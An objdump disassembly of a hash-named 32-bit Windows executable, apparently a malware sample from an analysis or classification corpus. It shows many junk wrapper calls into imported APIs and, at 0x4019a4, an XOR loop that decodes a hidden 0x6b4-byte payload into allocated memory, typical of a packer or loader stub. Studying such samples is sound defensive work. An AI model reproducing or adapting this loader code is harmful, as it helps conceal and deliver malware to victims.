
e1d0536c33d275342feaa2a456168fa8060e87c47541929a6032c6976b2308aa.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	mov    edi,edi
  401002:	push   ebp
  401003:	mov    ebp,esp
  401005:	sub    esp,0x30
  401008:	push   eax
  401009:	push   edx
  40100a:	push   esi
  40100b:	call   0x4025bc
  401010:	add    esp,0x8
  401013:	pop    eax
  401014:	push   eax
  401015:	mov    edx,0x0
  40101a:	push   edx
  40101b:	mov    eax,0x404000
  401020:	call   DWORD PTR [eax]
  401022:	pop    eax
  401023:	push   eax
  401024:	mov    eax,0x404044
  401029:	call   DWORD PTR [eax]
  40102b:	pop    eax
  40102c:	sub    esp,0xffffffd0
  40102f:	mov    ebp,DWORD PTR [esp]
  401032:	add    esp,0x4
  401035:	ret    
  401036:	add    BYTE PTR [eax],al
  401038:	mov    edi,edi
  40103a:	push   ebp
  40103b:	mov    ebp,esp
  40103d:	sub    esp,0x1c
  401040:	push   eax
  401041:	push   edi
  401042:	push   esi
  401043:	push   edx
  401044:	call   0x40224c
  401049:	add    esp,0xc
  40104c:	pop    eax
  40104d:	push   eax
  40104e:	push   0x0
  401050:	mov    eax,0x40404c
  401055:	call   DWORD PTR [eax]
  401057:	pop    eax
  401058:	push   eax
  401059:	mov    eax,0x404044
  40105e:	call   DWORD PTR [eax]
  401060:	pop    eax
  401061:	sub    esp,0xffffffe4
  401064:	mov    ebp,DWORD PTR [esp]
  401067:	add    esp,0x4
  40106a:	ret    
  40106b:	add    BYTE PTR [ecx-0x3d],ah
  40106e:	add    BYTE PTR [eax],al
  401070:	mov    edi,edi
  401072:	push   ebp
  401073:	mov    ebp,esp
  401075:	sub    esp,0x5c
  401078:	push   eax
  401079:	mov    eax,0x0
  40107e:	push   eax
  40107f:	mov    eax,0x404080
  401084:	call   DWORD PTR [eax]
  401086:	pop    eax
  401087:	push   eax
  401088:	push   esi
  401089:	push   edx
  40108a:	call   0x402434
  40108f:	add    esp,0x8
  401092:	pop    eax
  401093:	push   eax
  401094:	push   0x0
  401096:	mov    eax,0x404030
  40109b:	call   DWORD PTR [eax]
  40109d:	pop    eax
  40109e:	sub    esp,0xffffffa4
  4010a1:	mov    ebp,DWORD PTR [esp]
  4010a4:	add    esp,0x4
  4010a7:	ret    
	...
  4010f8:	mov    edi,edi
  4010fa:	push   ebp
  4010fb:	mov    ebp,esp
  4010fd:	sub    esp,0x20
  401100:	push   eax
  401101:	push   edi
  401102:	push   esi
  401103:	push   edx
  401104:	call   0x401ac4
  401109:	add    esp,0xc
  40110c:	pop    eax
  40110d:	push   eax
  40110e:	mov    ebx,0x0
  401113:	push   ebx
  401114:	mov    eax,0x40406c
  401119:	call   DWORD PTR [eax]
  40111b:	pop    eax
  40111c:	mov    edx,0x404020
  401121:	mov    edx,DWORD PTR [edx]
  401123:	push   edx
  401124:	push   DWORD PTR [eax+0x164]
  40112a:	pop    ebx
  40112b:	call   ebx
  40112d:	sub    esp,0xffffffe0
  401130:	mov    ebp,DWORD PTR [esp]
  401133:	add    esp,0x4
  401136:	ret    
  401137:	add    BYTE PTR [ebx-0x1374aa01],cl
  40113d:	sub    esp,0x20
  401140:	push   eax
  401141:	push   0x0
  401143:	mov    eax,0x40404c
  401148:	call   DWORD PTR [eax]
  40114a:	pop    eax
  40114b:	push   eax
  40114c:	push   DWORD PTR [eax+0x364]
  401152:	push   DWORD PTR [eax+0x1a4]
  401158:	call   0x401874
  40115d:	add    esp,0x8
  401160:	pop    eax
  401161:	push   eax
  401162:	mov    eax,0x404044
  401167:	call   DWORD PTR [eax]
  401169:	pop    eax
  40116a:	sub    esp,0xffffffe0
  40116d:	mov    ebp,DWORD PTR [esp]
  401170:	add    esp,0x4
  401173:	ret    
	...
  4011c4:	mov    edi,edi
  4011c6:	push   ebp
  4011c7:	mov    ebp,esp
  4011c9:	sub    esp,0x24
  4011cc:	push   eax
  4011cd:	mov    edi,0x0
  4011d2:	push   edi
  4011d3:	mov    eax,0x404080
  4011d8:	call   DWORD PTR [eax]
  4011da:	pop    eax
  4011db:	push   eax
  4011dc:	push   DWORD PTR [eax+0x2c4]
  4011e2:	push   ecx
  4011e3:	call   0x4016c8
  4011e8:	add    esp,0x8
  4011eb:	pop    eax
  4011ec:	push   eax
  4011ed:	push   0x0
  4011ef:	mov    eax,0x404080
  4011f4:	call   DWORD PTR [eax]
  4011f6:	pop    eax
  4011f7:	sub    esp,0xffffffdc
  4011fa:	mov    ebp,DWORD PTR [esp]
  4011fd:	add    esp,0x4
  401200:	ret    
	...
  4012a1:	add    BYTE PTR [eax],al
  4012a3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4012a9:	sub    esp,0x38
  4012ac:	push   eax
  4012ad:	push   0x0
  4012af:	mov    eax,0x404034
  4012b4:	call   DWORD PTR [eax]
  4012b6:	pop    eax
  4012b7:	push   eax
  4012b8:	push   DWORD PTR [eax+0x2bc]
  4012be:	push   DWORD PTR [eax+0xbc]
  4012c4:	push   DWORD PTR [eax+0xe8]
  4012ca:	push   edi
  4012cb:	call   0x40276c
  4012d0:	add    esp,0x10
  4012d3:	pop    eax
  4012d4:	push   eax
  4012d5:	mov    ecx,0x0
  4012da:	push   ecx
  4012db:	mov    eax,0x40402c
  4012e0:	call   DWORD PTR [eax]
  4012e2:	pop    eax
  4012e3:	sub    esp,0xffffffc8
  4012e6:	mov    ebp,DWORD PTR [esp]
  4012e9:	add    esp,0x4
  4012ec:	ret    
  4012ed:	add    BYTE PTR [eax],al
  4012ef:	add    BYTE PTR [ebx-0x1374aa01],cl
  4012f5:	sub    esp,0x44
  4012f8:	push   eax
  4012f9:	mov    eax,0x404014
  4012fe:	call   DWORD PTR [eax]
  401300:	pop    eax
  401301:	push   eax
  401302:	push   DWORD PTR [eax+0x314]
  401308:	push   ecx
  401309:	call   0x4023e8
  40130e:	add    esp,0x8
  401311:	pop    eax
  401312:	push   eax
  401313:	mov    esi,0x0
  401318:	push   esi
  401319:	mov    eax,0x404040
  40131e:	call   DWORD PTR [eax]
  401320:	pop    eax
  401321:	sub    esp,0xffffffbc
  401324:	mov    ebp,DWORD PTR [esp]
  401327:	add    esp,0x4
  40132a:	ret    
	...
  40137b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401381:	sub    esp,0x28
  401384:	push   eax
  401385:	push   DWORD PTR [eax+0x1e0]
  40138b:	push   ebx
  40138c:	call   0x4015b4
  401391:	add    esp,0x8
  401394:	pop    eax
  401395:	push   eax
  401396:	push   0x0
  401398:	mov    eax,0x404030
  40139d:	call   DWORD PTR [eax]
  40139f:	pop    eax
  4013a0:	push   eax
  4013a1:	mov    eax,0x404014
  4013a6:	call   DWORD PTR [eax]
  4013a8:	pop    eax
  4013a9:	sub    esp,0xffffffd8
  4013ac:	mov    ebp,DWORD PTR [esp]
  4013af:	add    esp,0x4
  4013b2:	ret    
	...
  401403:	add    BYTE PTR [ebx-0x1374aa01],cl
  401409:	sub    esp,0x48
  40140c:	push   eax
  40140d:	push   DWORD PTR [eax+0x3e0]
  401413:	push   ebx
  401414:	push   esi
  401415:	call   0x4011c4
  40141a:	add    esp,0xc
  40141d:	pop    eax
  40141e:	push   eax
  40141f:	lea    eax,[eax-0x100]
  401425:	push   eax
  401426:	mov    eax,0x404020
  40142b:	call   DWORD PTR [eax]
  40142d:	test   eax,eax
  40142f:	jne    0x40141f
  401431:	pop    eax
  401432:	push   eax
  401433:	push   0x0
  401435:	mov    eax,0x404000
  40143a:	call   DWORD PTR [eax]
  40143c:	pop    eax
  40143d:	sub    esp,0xffffffb8
  401440:	mov    ebp,DWORD PTR [esp]
  401443:	add    esp,0x4
  401446:	ret    
  401447:	add    BYTE PTR [ebx-0x1374aa01],cl
  40144d:	sub    esp,0x44
  401450:	push   eax
  401451:	push   0x0
  401453:	mov    eax,0x404030
  401458:	call   DWORD PTR [eax]
  40145a:	pop    eax
  40145b:	push   eax
  40145c:	push   DWORD PTR [eax+0xc8]
  401462:	push   edx
  401463:	push   DWORD PTR [eax+0x3dc]
  401469:	call   0x401758
  40146e:	add    esp,0xc
  401471:	pop    eax
  401472:	push   eax
  401473:	push   0x0
  401475:	mov    eax,0x404030
  40147a:	call   DWORD PTR [eax]
  40147c:	pop    eax
  40147d:	sub    esp,0xffffffbc
  401480:	mov    ebp,DWORD PTR [esp]
  401483:	add    esp,0x4
  401486:	ret    
	...
  4014d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4014dd:	sub    esp,0x44
  4014e0:	push   eax
  4014e1:	mov    esi,0x0
  4014e6:	push   esi
  4014e7:	mov    eax,0x40402c
  4014ec:	call   DWORD PTR [eax]
  4014ee:	pop    eax
  4014ef:	push   eax
  4014f0:	push   DWORD PTR [eax+0x3a4]
  4014f6:	push   ecx
  4014f7:	call   0x401798
  4014fc:	add    esp,0x8
  4014ff:	pop    eax
  401500:	push   eax
  401501:	mov    eax,0x404044
  401506:	call   DWORD PTR [eax]
  401508:	pop    eax
  401509:	sub    esp,0xffffffbc
  40150c:	mov    ebp,DWORD PTR [esp]
  40150f:	add    esp,0x4
  401512:	ret    
	...
  4015b3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4015b9:	sub    esp,0x44
  4015bc:	push   eax
  4015bd:	push   0x0
  4015bf:	mov    eax,0x40403c
  4015c4:	call   DWORD PTR [eax]
  4015c6:	pop    eax
  4015c7:	push   eax
  4015c8:	push   DWORD PTR [eax+0x98]
  4015ce:	push   DWORD PTR [eax+0x1ec]
  4015d4:	push   esi
  4015d5:	push   esi
  4015d6:	call   0x401cac
  4015db:	add    esp,0x10
  4015de:	pop    eax
  4015df:	push   eax
  4015e0:	push   0x0
  4015e2:	mov    eax,0x40406c
  4015e7:	call   DWORD PTR [eax]
  4015e9:	pop    eax
  4015ea:	sub    esp,0xffffffbc
  4015ed:	mov    ebp,DWORD PTR [esp]
  4015f0:	add    esp,0x4
  4015f3:	ret    
  4015f4:	mov    edi,edi
  4015f6:	push   ebp
  4015f7:	mov    ebp,esp
  4015f9:	sub    esp,0x24
  4015fc:	push   eax
  4015fd:	mov    eax,0x404018
  401602:	call   DWORD PTR [eax]
  401604:	pop    eax
  401605:	push   eax
  401606:	push   ebx
  401607:	push   esi
  401608:	push   edx
  401609:	call   0x402044
  40160e:	add    esp,0xc
  401611:	pop    eax
  401612:	push   eax
  401613:	mov    eax,0x404014
  401618:	call   DWORD PTR [eax]
  40161a:	pop    eax
  40161b:	sub    esp,0xffffffdc
  40161e:	mov    ebp,DWORD PTR [esp]
  401621:	add    esp,0x4
  401624:	ret    
	...
  4016c5:	add    BYTE PTR [eax],al
  4016c7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4016cd:	sub    esp,0x50
  4016d0:	push   eax
  4016d1:	push   0x0
  4016d3:	mov    eax,0x40404c
  4016d8:	call   DWORD PTR [eax]
  4016da:	pop    eax
  4016db:	push   eax
  4016dc:	push   edx
  4016dd:	push   DWORD PTR [eax+0x2ec]
  4016e3:	push   DWORD PTR [eax+0x1c4]
  4016e9:	call   0x402350
  4016ee:	add    esp,0xc
  4016f1:	pop    eax
  4016f2:	push   eax
  4016f3:	push   0x0
  4016f5:	mov    eax,0x404080
  4016fa:	call   DWORD PTR [eax]
  4016fc:	pop    eax
  4016fd:	sub    esp,0xffffffb0
  401700:	mov    ebp,DWORD PTR [esp]
  401703:	add    esp,0x4
  401706:	ret    
	...
  401757:	add    BYTE PTR [ebx-0x1374aa01],cl
  40175d:	sub    esp,0x2c
  401760:	push   eax
  401761:	push   DWORD PTR [eax+0x4c]
  401764:	push   DWORD PTR [eax+0x354]
  40176a:	push   edx
  40176b:	call   0x401cec
  401770:	add    esp,0xc
  401773:	pop    eax
  401774:	push   eax
  401775:	mov    edx,0x0
  40177a:	push   edx
  40177b:	mov    eax,0x40406c
  401780:	call   DWORD PTR [eax]
  401782:	pop    eax
  401783:	push   eax
  401784:	push   0x0
  401786:	mov    eax,0x404040
  40178b:	call   DWORD PTR [eax]
  40178d:	pop    eax
  40178e:	sub    esp,0xffffffd4
  401791:	mov    ebp,DWORD PTR [esp]
  401794:	add    esp,0x4
  401797:	ret    
  401798:	mov    edi,edi
  40179a:	push   ebp
  40179b:	mov    ebp,esp
  40179d:	sub    esp,0x38
  4017a0:	push   eax
  4017a1:	push   0x0
  4017a3:	mov    eax,0x404080
  4017a8:	call   DWORD PTR [eax]
  4017aa:	pop    eax
  4017ab:	push   eax
  4017ac:	push   ecx
  4017ad:	push   DWORD PTR [eax+0x3b0]
  4017b3:	call   0x401000
  4017b8:	add    esp,0x8
  4017bb:	pop    eax
  4017bc:	push   eax
  4017bd:	push   0x0
  4017bf:	mov    eax,0x404074
  4017c4:	call   DWORD PTR [eax]
  4017c6:	pop    eax
  4017c7:	sub    esp,0xffffffc8
  4017ca:	mov    ebp,DWORD PTR [esp]
  4017cd:	add    esp,0x4
  4017d0:	ret    
  4017d1:	add    BYTE PTR [eax],al
  4017d3:	add    BYTE PTR [eax+0x33],ah
  4017d6:	rcl    BYTE PTR [edx-0x1],cl
  4017d9:	adc    eax,0x404080
  4017de:	mov    eax,0x404098
  4017e3:	sub    eax,0x1
  4017e6:	push   0x0
  4017e8:	call   DWORD PTR [eax+0x1]
  4017eb:	xor    edx,edx
  4017ed:	add    edx,0x458200
  4017f3:	dec    dh
  4017f5:	push   edx
  4017f6:	lea    ecx,[edx+0xc]
  4017f9:	add    BYTE PTR [ecx],0x4
  4017fc:	push   edx
  4017fd:	call   DWORD PTR ds:0x404048
  401803:	mov    ecx,eax
  401805:	mov    cl,0x3c
  401807:	mov    ecx,DWORD PTR [ecx]
  401809:	mov    ecx,DWORD PTR [eax+ecx*1+0x1c]
  40180d:	ror    ecx,0xc
  401810:	mov    eax,ecx
  401812:	cmp    al,0x10
  401814:	pop    eax
  401815:	jb     0x40106c
  40181b:	ja     0x4010f8
  401821:	ret    
	...
  401872:	add    BYTE PTR [eax],al
  401874:	mov    edi,edi
  401876:	push   ebp
  401877:	mov    ebp,esp
  401879:	sub    esp,0x28
  40187c:	push   eax
  40187d:	push   ebx
  40187e:	push   DWORD PTR [eax+0x1ac]
  401884:	push   DWORD PTR [eax+0x25c]
  40188a:	push   DWORD PTR [eax+0x2b8]
  401890:	call   0x40137c
  401895:	add    esp,0x10
  401898:	pop    eax
  401899:	push   eax
  40189a:	push   0x0
  40189c:	mov    eax,0x40406c
  4018a1:	call   DWORD PTR [eax]
  4018a3:	pop    eax
  4018a4:	push   eax
  4018a5:	mov    edi,0x0
  4018aa:	push   edi
  4018ab:	mov    eax,0x40402c
  4018b0:	call   DWORD PTR [eax]
  4018b2:	pop    eax
  4018b3:	sub    esp,0xffffffd8
  4018b6:	mov    ebp,DWORD PTR [esp]
  4018b9:	add    esp,0x4
  4018bc:	ret    
	...
  40195d:	add    BYTE PTR [eax],al
  40195f:	add    BYTE PTR [ebx-0x1374aa01],cl
  401965:	sub    esp,0x38
  401968:	push   eax
  401969:	push   esi
  40196a:	push   DWORD PTR [eax+0x218]
  401970:	push   ecx
  401971:	call   0x401b00
  401976:	add    esp,0xc
  401979:	pop    eax
  40197a:	push   eax
  40197b:	mov    ecx,0x0
  401980:	push   ecx
  401981:	mov    eax,0x404040
  401986:	call   DWORD PTR [eax]
  401988:	pop    eax
  401989:	push   eax
  40198a:	mov    ecx,0x0
  40198f:	push   ecx
  401990:	mov    eax,0x404038
  401995:	call   DWORD PTR [eax]
  401997:	pop    eax
  401998:	sub    esp,0xffffffc8
  40199b:	mov    ebp,DWORD PTR [esp]
  40199e:	add    esp,0x4
  4019a1:	ret    
  4019a2:	add    BYTE PTR [eax],al
  4019a4:	mov    edi,edi
  4019a6:	push   ebp
  4019a7:	mov    ebp,esp
  4019a9:	sub    esp,0x60
  4019ac:	push   eax
  4019ad:	push   0x6b4
  4019b2:	mov    eax,0x6b4
  4019b7:	push   eax
  4019b8:	mov    edi,0x40001
  4019bd:	push   edi
  4019be:	push   0x0
  4019c0:	xor    DWORD PTR [esp],0x89e6ba55
  4019c7:	pop    eax
  4019c8:	sub    eax,0x89a67a45
  4019cd:	push   DWORD PTR [eax]
  4019cf:	sub    DWORD PTR [esp],0x2
  4019d3:	mov    eax,0x404048
  4019d8:	pop    DWORD PTR [eax]
  4019da:	mov    eax,0x404048
  4019df:	call   DWORD PTR [eax]
  4019e1:	xchg   DWORD PTR [esp],eax
  4019e4:	pop    DWORD PTR [eax+0x164]
  4019ea:	mov    edi,DWORD PTR [eax+0x164]
  4019f0:	lea    edx,[edi]
  4019f2:	sub    ecx,ecx
  4019f4:	dec    ecx
  4019f5:	and    ecx,0x402956
  4019fb:	mov    edi,0x7a89d45a
  401a00:	xor    ebx,ebx
  401a02:	cmp    ebx,0x6b4
  401a08:	je     0x401a2c
  401a0a:	sub    ebx,0xfffffffc
  401a0d:	mov    esi,edi
  401a0f:	xor    esi,DWORD PTR [ecx]
  401a11:	push   esi
  401a12:	sub    esi,esi
  401a14:	sub    DWORD PTR [esp],0x1
  401a18:	pop    DWORD PTR [edx+esi*2]
  401a1b:	push   0x0
  401a1d:	sub    DWORD PTR [esp],edi
  401a20:	mov    edi,0xfffffffc
  401a25:	sub    ecx,edi
  401a27:	sub    edx,edi
  401a29:	pop    edi
  401a2a:	jmp    0x401a02
  401a2c:	push   eax
  401a2d:	push   0x0
  401a2f:	mov    eax,0x40406c
  401a34:	call   DWORD PTR [eax]
  401a36:	pop    eax
  401a37:	sub    esp,0xffffffa0
  401a3a:	pop    ebp
  401a3b:	ret    
  401a3c:	mov    edi,edi
  401a3e:	push   ebp
  401a3f:	mov    ebp,esp
  401a41:	sub    esp,0x60
  401a44:	push   eax
  401a45:	mov    eax,0x404018
  401a4a:	call   DWORD PTR [eax]
  401a4c:	pop    eax
  401a4d:	push   eax
  401a4e:	push   DWORD PTR [eax+0xe0]
  401a54:	push   DWORD PTR [eax+0x38]
  401a57:	call   0x401d68
  401a5c:	add    esp,0x8
  401a5f:	pop    eax
  401a60:	push   eax
  401a61:	mov    eax,0x404014
  401a66:	call   DWORD PTR [eax]
  401a68:	pop    eax
  401a69:	sub    esp,0xffffffa0
  401a6c:	mov    ebp,DWORD PTR [esp]
  401a6f:	add    esp,0x4
  401a72:	ret    
	...
  401ac3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401ac9:	sub    esp,0x4c
  401acc:	push   eax
  401acd:	mov    eax,0x404014
  401ad2:	call   DWORD PTR [eax]
  401ad4:	pop    eax
  401ad5:	push   eax
  401ad6:	push   esi
  401ad7:	push   DWORD PTR [eax+0x35c]
  401add:	push   ecx
  401ade:	push   edi
  401adf:	call   0x4022d0
  401ae4:	add    esp,0x10
  401ae7:	pop    eax
  401ae8:	push   eax
  401ae9:	push   0x0
  401aeb:	mov    eax,0x404074
  401af0:	call   DWORD PTR [eax]
  401af2:	pop    eax
  401af3:	sub    esp,0xffffffb4
  401af6:	mov    ebp,DWORD PTR [esp]
  401af9:	add    esp,0x4
  401afc:	ret    
  401afd:	add    BYTE PTR [eax],al
  401aff:	add    BYTE PTR [ebx-0x1374aa01],cl
  401b05:	sub    esp,0x28
  401b08:	push   eax
  401b09:	mov    ecx,0x0
  401b0e:	push   ecx
  401b0f:	mov    eax,0x404030
  401b14:	call   DWORD PTR [eax]
  401b16:	pop    eax
  401b17:	push   eax
  401b18:	push   DWORD PTR [eax]
  401b1a:	push   edx
  401b1b:	push   edi
  401b1c:	call   0x401d2c
  401b21:	add    esp,0xc
  401b24:	pop    eax
  401b25:	push   eax
  401b26:	push   0x0
  401b28:	mov    eax,0x40406c
  401b2d:	call   DWORD PTR [eax]
  401b2f:	pop    eax
  401b30:	sub    esp,0xffffffd8
  401b33:	mov    ebp,DWORD PTR [esp]
  401b36:	add    esp,0x4
  401b39:	ret    
	...
  401b8a:	add    BYTE PTR [eax],al
  401b8c:	mov    edi,edi
  401b8e:	push   ebp
  401b8f:	mov    ebp,esp
  401b91:	sub    esp,0x20
  401b94:	push   eax
  401b95:	mov    edx,0x0
  401b9a:	push   edx
  401b9b:	mov    eax,0x40406c
  401ba0:	call   DWORD PTR [eax]
  401ba2:	pop    eax
  401ba3:	push   eax
  401ba4:	push   ebx
  401ba5:	push   ecx
  401ba6:	push   DWORD PTR [eax+0x3fc]
  401bac:	push   edx
  401bad:	call   0x4012a4
  401bb2:	add    esp,0x10
  401bb5:	pop    eax
  401bb6:	push   eax
  401bb7:	push   0x0
  401bb9:	mov    eax,0x404040
  401bbe:	call   DWORD PTR [eax]
  401bc0:	pop    eax
  401bc1:	sub    esp,0xffffffe0
  401bc4:	mov    ebp,DWORD PTR [esp]
  401bc7:	add    esp,0x4
  401bca:	ret    
  401bcb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401bd1:	sub    esp,0x5c
  401bd4:	push   eax
  401bd5:	lea    eax,[eax-0x100]
  401bdb:	push   eax
  401bdc:	mov    eax,0x404020
  401be1:	call   DWORD PTR [eax]
  401be3:	test   eax,eax
  401be5:	jne    0x401bd5
  401be7:	pop    eax
  401be8:	push   eax
  401be9:	push   DWORD PTR [eax+0x108]
  401bef:	push   DWORD PTR [eax+0x38]
  401bf2:	push   esi
  401bf3:	push   ebx
  401bf4:	call   0x401404
  401bf9:	add    esp,0x10
  401bfc:	pop    eax
  401bfd:	push   eax
  401bfe:	mov    esi,0x0
  401c03:	push   esi
  401c04:	mov    eax,0x404030
  401c09:	call   DWORD PTR [eax]
  401c0b:	pop    eax
  401c0c:	sub    esp,0xffffffa4
  401c0f:	mov    ebp,DWORD PTR [esp]
  401c12:	add    esp,0x4
  401c15:	ret    
  401c16:	add    BYTE PTR [eax],al
  401c18:	mov    edi,edi
  401c1a:	push   ebp
  401c1b:	mov    ebp,esp
  401c1d:	sub    esp,0x40
  401c20:	push   eax
  401c21:	push   DWORD PTR [eax+0x180]
  401c27:	push   edx
  401c28:	push   ecx
  401c29:	call   0x402538
  401c2e:	add    esp,0xc
  401c31:	pop    eax
  401c32:	push   eax
  401c33:	mov    edi,0x0
  401c38:	push   edi
  401c39:	mov    eax,0x404000
  401c3e:	call   DWORD PTR [eax]
  401c40:	pop    eax
  401c41:	push   eax
  401c42:	mov    esi,0x0
  401c47:	push   esi
  401c48:	mov    eax,0x404030
  401c4d:	call   DWORD PTR [eax]
  401c4f:	pop    eax
  401c50:	sub    esp,0xffffffc0
  401c53:	mov    ebp,DWORD PTR [esp]
  401c56:	add    esp,0x4
  401c59:	ret    
	...
  401caa:	add    BYTE PTR [eax],al
  401cac:	mov    edi,edi
  401cae:	push   ebp
  401caf:	mov    ebp,esp
  401cb1:	sub    esp,0x3c
  401cb4:	push   eax
  401cb5:	push   DWORD PTR [eax+0x3d0]
  401cbb:	push   ecx
  401cbc:	push   DWORD PTR [eax+0x1f8]
  401cc2:	call   0x4012f0
  401cc7:	add    esp,0xc
  401cca:	pop    eax
  401ccb:	push   eax
  401ccc:	mov    eax,0x404044
  401cd1:	call   DWORD PTR [eax]
  401cd3:	pop    eax
  401cd4:	push   eax
  401cd5:	push   0x0
  401cd7:	mov    eax,0x40402c
  401cdc:	call   DWORD PTR [eax]
  401cde:	pop    eax
  401cdf:	sub    esp,0xffffffc4
  401ce2:	mov    ebp,DWORD PTR [esp]
  401ce5:	add    esp,0x4
  401ce8:	ret    
  401ce9:	add    BYTE PTR [eax],al
  401ceb:	add    BYTE PTR [ebx-0x1374aa01],cl
  401cf1:	sub    esp,0x50
  401cf4:	push   eax
  401cf5:	mov    edx,0x0
  401cfa:	push   edx
  401cfb:	mov    eax,0x40402c
  401d00:	call   DWORD PTR [eax]
  401d02:	pop    eax
  401d03:	push   eax
  401d04:	push   DWORD PTR [eax+0xec]
  401d0a:	push   DWORD PTR [eax+0x44]
  401d0d:	push   edi
  401d0e:	push   esi
  401d0f:	call   0x401b8c
  401d14:	add    esp,0x10
  401d17:	pop    eax
  401d18:	push   eax
  401d19:	mov    eax,0x404014
  401d1e:	call   DWORD PTR [eax]
  401d20:	pop    eax
  401d21:	sub    esp,0xffffffb0
  401d24:	mov    ebp,DWORD PTR [esp]
  401d27:	add    esp,0x4
  401d2a:	ret    
  401d2b:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d31:	sub    esp,0x24
  401d34:	push   eax
  401d35:	push   DWORD PTR [eax+0x354]
  401d3b:	push   ebx
  401d3c:	push   esi
  401d3d:	push   edx
  401d3e:	call   0x401038
  401d43:	add    esp,0x10
  401d46:	pop    eax
  401d47:	push   eax
  401d48:	push   0x0
  401d4a:	mov    eax,0x404034
  401d4f:	call   DWORD PTR [eax]
  401d51:	pop    eax
  401d52:	push   eax
  401d53:	mov    eax,0x404014
  401d58:	call   DWORD PTR [eax]
  401d5a:	pop    eax
  401d5b:	sub    esp,0xffffffdc
  401d5e:	mov    ebp,DWORD PTR [esp]
  401d61:	add    esp,0x4
  401d64:	ret    
  401d65:	add    BYTE PTR [eax],al
  401d67:	add    BYTE PTR [ebx-0x1374aa01],cl
  401d6d:	sub    esp,0x24
  401d70:	push   eax
  401d71:	push   esi
  401d72:	push   ebx
  401d73:	call   0x401f6c
  401d78:	add    esp,0x8
  401d7b:	pop    eax
  401d7c:	push   eax
  401d7d:	mov    ebx,0x0
  401d82:	push   ebx
  401d83:	mov    eax,0x40404c
  401d88:	call   DWORD PTR [eax]
  401d8a:	pop    eax
  401d8b:	push   eax
  401d8c:	push   0x0
  401d8e:	mov    eax,0x404030
  401d93:	call   DWORD PTR [eax]
  401d95:	pop    eax
  401d96:	sub    esp,0xffffffdc
  401d99:	mov    ebp,DWORD PTR [esp]
  401d9c:	add    esp,0x4
  401d9f:	ret    
  401da0:	mov    edi,edi
  401da2:	push   ebp
  401da3:	mov    ebp,esp
  401da5:	sub    esp,0x40
  401da8:	push   eax
  401da9:	push   DWORD PTR [eax+0x28c]
  401daf:	push   ebx
  401db0:	push   ecx
  401db1:	call   0x4024c4
  401db6:	add    esp,0xc
  401db9:	pop    eax
  401dba:	push   eax
  401dbb:	push   0x0
  401dbd:	mov    eax,0x40402c
  401dc2:	call   DWORD PTR [eax]
  401dc4:	pop    eax
  401dc5:	push   eax
  401dc6:	push   0x0
  401dc8:	mov    eax,0x404080
  401dcd:	call   DWORD PTR [eax]
  401dcf:	pop    eax
  401dd0:	sub    esp,0xffffffc0
  401dd3:	mov    ebp,DWORD PTR [esp]
  401dd6:	add    esp,0x4
  401dd9:	ret    
	...
  401f6a:	add    BYTE PTR [eax],al
  401f6c:	mov    edi,edi
  401f6e:	push   ebp
  401f6f:	mov    ebp,esp
  401f71:	sub    esp,0x58
  401f74:	push   eax
  401f75:	push   DWORD PTR [eax+0x14]
  401f78:	push   DWORD PTR [eax+0x1e0]
  401f7e:	push   DWORD PTR [eax+0x278]
  401f84:	call   0x4015f4
  401f89:	add    esp,0xc
  401f8c:	pop    eax
  401f8d:	push   eax
  401f8e:	mov    ecx,0x0
  401f93:	push   ecx
  401f94:	mov    eax,0x40406c
  401f99:	call   DWORD PTR [eax]
  401f9b:	pop    eax
  401f9c:	push   eax
  401f9d:	push   0x0
  401f9f:	mov    eax,0x40403c
  401fa4:	call   DWORD PTR [eax]
  401fa6:	pop    eax
  401fa7:	sub    esp,0xffffffa8
  401faa:	mov    ebp,DWORD PTR [esp]
  401fad:	add    esp,0x4
  401fb0:	ret    
  401fb1:	add    BYTE PTR [eax],al
  401fb3:	add    BYTE PTR [ebx-0x1374aa01],cl
  401fb9:	sub    esp,0x54
  401fbc:	push   eax
  401fbd:	push   DWORD PTR [eax+0x10c]
  401fc3:	push   DWORD PTR [eax+0x1c]
  401fc6:	push   edi
  401fc7:	push   edx
  401fc8:	call   0x401da0
  401fcd:	add    esp,0x10
  401fd0:	pop    eax
  401fd1:	push   eax
  401fd2:	push   0x0
  401fd4:	mov    eax,0x404000
  401fd9:	call   DWORD PTR [eax]
  401fdb:	pop    eax
  401fdc:	push   eax
  401fdd:	push   0x0
  401fdf:	mov    eax,0x40402c
  401fe4:	call   DWORD PTR [eax]
  401fe6:	pop    eax
  401fe7:	sub    esp,0xffffffac
  401fea:	mov    ebp,DWORD PTR [esp]
  401fed:	add    esp,0x4
  401ff0:	ret    
	...
  402041:	add    BYTE PTR [eax],al
  402043:	add    BYTE PTR [ebx-0x1374aa01],cl
  402049:	sub    esp,0x4c
  40204c:	push   eax
  40204d:	mov    eax,0x404018
  402052:	call   DWORD PTR [eax]
  402054:	pop    eax
  402055:	push   eax
  402056:	push   esi
  402057:	push   edx
  402058:	call   0x4024fc
  40205d:	add    esp,0x8
  402060:	pop    eax
  402061:	push   eax
  402062:	push   0x0
  402064:	mov    eax,0x404074
  402069:	call   DWORD PTR [eax]
  40206b:	pop    eax
  40206c:	sub    esp,0xffffffb4
  40206f:	mov    ebp,DWORD PTR [esp]
  402072:	add    esp,0x4
  402075:	ret    
	...
  402116:	add    BYTE PTR [eax],al
  402118:	mov    edi,edi
  40211a:	push   ebp
  40211b:	mov    ebp,esp
  40211d:	sub    esp,0x34
  402120:	push   eax
  402121:	push   0x0
  402123:	mov    eax,0x404030
  402128:	call   DWORD PTR [eax]
  40212a:	pop    eax
  40212b:	push   eax
  40212c:	push   DWORD PTR [eax+0x1b8]
  402132:	push   DWORD PTR [eax+0x2e0]
  402138:	push   DWORD PTR [eax+0x4]
  40213b:	call   0x401a3c
  402140:	add    esp,0xc
  402143:	pop    eax
  402144:	push   eax
  402145:	push   0x0
  402147:	mov    eax,0x404040
  40214c:	call   DWORD PTR [eax]
  40214e:	pop    eax
  40214f:	sub    esp,0xffffffcc
  402152:	mov    ebp,DWORD PTR [esp]
  402155:	add    esp,0x4
  402158:	ret    
	...
  402249:	add    BYTE PTR [eax],al
  40224b:	add    BYTE PTR [ebx-0x1374aa01],cl
